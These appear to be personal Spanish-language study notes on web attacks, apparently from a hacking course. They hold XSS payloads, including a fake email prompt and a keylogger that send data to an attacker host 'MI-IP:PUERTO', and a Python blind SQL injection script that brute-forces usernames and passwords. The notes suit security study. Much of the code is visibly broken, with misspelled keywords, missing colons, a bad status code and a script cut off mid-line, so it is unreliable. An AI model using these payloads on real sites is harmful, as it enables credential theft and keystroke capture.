![[Pasted image 20240208124843.png]]


![[Pasted image 20240208125612.png]]


![[Pasted image 20240208125442.png]]


### SQLI (XSS)

xss
```python
<script>alert("XSS")</script>
```
xss
```python
<script>
var email= prompt("introduce tu correo");

if (email==null || email == ""){
	alert("Es necesario introducir un correo valido para visualizar el post"); 
} else {
	fetch("http://MI-IP:PUERTO/?email=" + email);
}
</script>
```

xss keylogger
```python
<script>
	var k = "";
	document.onkeypress = funtion(e){
	e = e weindow.event;
	k += e.key
	var i = new Imagen();
	i.src = "http://MI-IP:PUERTO/" + k;
	}
</script>
```

```python
 #!/usr/bin/python3
import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
Characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando progreso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraidos")

	extracted_info = ""

	for position in range(1, 200)
		for character in range(33, 126):
			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password)from information_schema.schemata),%d,1))from users where id = 1)=%d)"
% (position,character)
	p1.status(sqli_url)

	r = request.get(sqli_url)

	if r.status_code == 2--:
		extracted_info += chr(character)
		p2.status(extracted_info)
		break
if __name__ == '__main__'
	
	makeSQLI()
```



```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo... \n)
```